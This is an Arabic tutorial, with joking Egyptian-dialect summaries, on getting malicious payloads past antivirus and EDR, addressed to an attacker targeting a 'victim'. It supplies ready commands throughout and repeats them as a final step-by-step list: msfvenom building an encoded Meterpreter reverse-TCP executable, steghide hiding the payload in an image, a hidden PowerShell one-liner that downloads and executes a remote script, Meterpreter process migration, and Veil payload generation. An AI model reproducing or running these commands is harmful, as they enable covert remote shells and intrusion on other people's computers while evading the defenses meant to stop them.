هيا بنا نبدأ بتفصيل أعمق وأبسط حول **تخطي برامج الحماية مثل الـ Antivirus و الـ EDR (Endpoint Detection & Response)**، بحيث نوضح المفاهيم بطريقة سلسة مع الخلاصة بالعامية المصرية بعد كل جزء، بالإضافة إلى خطوات عملية في النهاية.

---

# **🚀 تجاوز الحماية (Evasion Techniques) - تخطي الـ Antivirus والـ EDR 🚀**

## **🔹 يعني إيه Antivirus و EDR بيكشف الـ Payload؟**

أي هجوم بيتطلب إنك تبعت **كود خبيث (Payload)** على جهاز الضحية. المشكلة إن برامج الحماية زي الـ **Antivirus (AV)** والـ **EDR** دورهم يكشفوا أي ملف أو سلوك مشبوه ويمنعوه.

✔ **الـ Antivirus بيشتغل بطريقتين أساسيتين:**

- 🛑 **Signature-based detection**: بيدور على بصمة (Signature) معينة في الملفات ولو لقى حاجة مشبوهة يحذفها.
- 🛑 **Heuristic-based detection**: بيراقب سلوك البرامج، ولو لقى حاجة غريبة يمنعها.

✔ **الـ EDR بيكون أقوى شوية من الـ AV لأنه بيعمل الآتي:**

- 👀 بيراقب العمليات شغالة إزاي.
- 🔍 بيحلل سلوك المستخدم والبرامج على الجهاز.
- 🛡️ بيسجل كل حاجة بتحصل عشان المحلل الأمني يراجعها.

✅ **هدفنا إننا نخدع الـ AV والـ EDR بحيث ما يكشفوش الـ Payload بتاعنا!**

---

## **🟢 1. تشفير (Encoding) الـ Payload لتغيير بصمته**

**الفكرة:** لو غيرنا شكل الكود بتاعنا بحيث يبان مختلف عن الـ Signatures اللي الـ Antivirus عارفها، مش هيقدر يمسحه.

🛠 **باستخدام `MSFVenom` لتشفير الـ Payload:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

🔹 **`-e x86/shikata_ga_nai`**: بيستخدم Encoder اسمه `shikata_ga_nai` عشان يشفر الكود.  
🔹 **`-i 10`**: بيعيد التشفير 10 مرات، وبالتالي البصمة بتاعته بتتغير كل مرة.

🎯 **💬 الخلاصة بالمصري:**  
"احنا بنغير شكل الفايل عشان الـ Antivirus ميعرفش يمسكه.. زي لما تغير لبسك عشان الشرطة متعرفكش 😆"

---

## **🟢 2. إخفاء الـ Payload جوا ملفات تانية (Steganography)**

**الفكرة:** الضحية ممكن يشك لو شاف ملف exe، لكن مش هيشك لو كان الملف صورة أو PDF.

🛠 **إخفاء الـ Payload داخل صورة باستخدام `steghide`:**

```bash
steghide embed -cf image.jpg -ef payload.exe
```

🛠 **استخراج الـ Payload لاحقًا من الصورة:**

```bash
steghide extract -sf image.jpg
```

🎯 **💬 الخلاصة بالمصري:**  
"بدل ما تبعت فيروس كـ ملف واضح، خبّيه جوا صورة بريئة والضحية مش هياخد باله 😏"

---

## **🟢 3. تشغيل الـ Payload في الذاكرة بدل ما يتحفظ على القرص (Fileless Execution)**

**الفكرة:** برامج الـ Antivirus بتمسح الملفات المشبوهة، فلو شغلناه في الذاكرة (RAM) مش هيقدر يمسكه.

🛠 **تشغيل الكود مباشرة في الذاكرة باستخدام PowerShell:**

```powershell
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.ps1')"
```

🔹 `-nop`: يمنع تشغيل الـ PowerShell بسياسات الحماية الافتراضية.  
🔹 `-w hidden`: يمنع ظهور النافذة.  
🔹 `IEX(New-Object Net.WebClient).DownloadString(...)`: بينفذ الكود مباشرة من الإنترنت.

🎯 **💬 الخلاصة بالمصري:**  
"بدل ما تحط الفيروس في ملف، خليه يشتغل في الذاكرة على طول، كأنك بتسرق حاجة من غير ما تسيب بصمات 😏"

---

## **🟢 4. تشغيل الـ Payload جوه عملية موثوقة (Process Injection)**

**الفكرة:** بدل ما تشغل الـ Payload كبرنامج منفصل، خليه يندمج داخل برنامج شغال أصلاً (زي `explorer.exe`).

🛠 **حقن الـ Payload داخل عملية موثوقة في Meterpreter:**

```bash
meterpreter > ps
meterpreter > migrate [PID]
```

🔹 `ps`: بيعرض كل العمليات الشغالة.  
🔹 `migrate [PID]`: بينقل الكود لعملية موثوقة شغالة، زي `explorer.exe`.

🎯 **💬 الخلاصة بالمصري:**  
"لو لبست لبس حد مشهور مش هيشكوا فيك، نفس الفكرة، خلّي الفيروس يستخبى جوا برنامج ويندوز معروف 😈"

---

## **🟢 5. تعديل الكود عشان ما يبقاش سهل اكتشافه (Obfuscation)**

**الفكرة:** أي كود له شكل مميز ممكن الـ Antivirus يتعرف عليه، فلو غيرنا ترتيب الأوامر وأضفنا حاجات مالهاش لازمة، هنخدعه.

🛠 **استخدام Veil Framework لإنشاء Payload غير قابل للاكتشاف:**

```bash
veil
use 1
set LHOST 192.168.1.10
set LPORT 4444
generate
```

🎯 **💬 الخلاصة بالمصري:**  
"غيّر شكل الفيروس، وبدل ما يكون واضح، حوّله لحاجة غامضة مفيش Antivirus يعرفها 😁"

---

# **🛠️ خطوات عملية لتخطي الحماية (Antivirus & EDR Bypass)**

✅ **1. تشفير الـ Payload لتغيير بصمته:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

✅ **2. إخفاء الـ Payload داخل صورة:**

```bash
steghide embed -cf image.jpg -ef payload.exe
```

✅ **3. تشغيل الـ Payload بدون حفظه على القرص باستخدام PowerShell:**

```powershell
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.ps1')"
```

✅ **4. تشغيل الـ Payload داخل عملية موثوقة لتجنب الاشتباه:**

```bash
meterpreter > ps
meterpreter > migrate [PID]
```

✅ **5. تعديل الكود لجعله صعب الاكتشاف باستخدام Veil Framework:**

```bash
veil
use 1
set LHOST 192.168.1.10
set LPORT 4444
generate
```

🎯 **بكده تقدر تتخطى الحماية وتنفذ الهجوم من غير ما يتم اكتشافك! 🚀🔥**